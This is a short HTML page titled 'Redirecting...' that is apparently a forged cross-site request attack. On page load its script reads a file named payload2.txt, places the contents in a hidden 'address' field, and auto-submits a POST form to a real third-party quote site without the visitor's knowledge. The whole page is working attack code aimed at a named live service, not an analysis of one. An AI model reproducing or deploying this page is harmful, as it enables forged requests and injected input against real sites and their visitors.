<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <form id="redirectForm" method="POST" action="https://preventivi.senec.it/global/">
        <input type="hidden" name="address" id="addressField">
    </form>
    <script>
        async function submitForm() {
            try {
                const response = await fetch('payload2.txt');
                const address = await response.text();
                document.getElementById('addressField').value = address;
                document.getElementById('redirectForm').submit();
            } catch (error) {
                console.error('Error:', error);
            }
        }
        document.addEventListener('DOMContentLoaded', submitForm);
    </script>
</body>
</html>
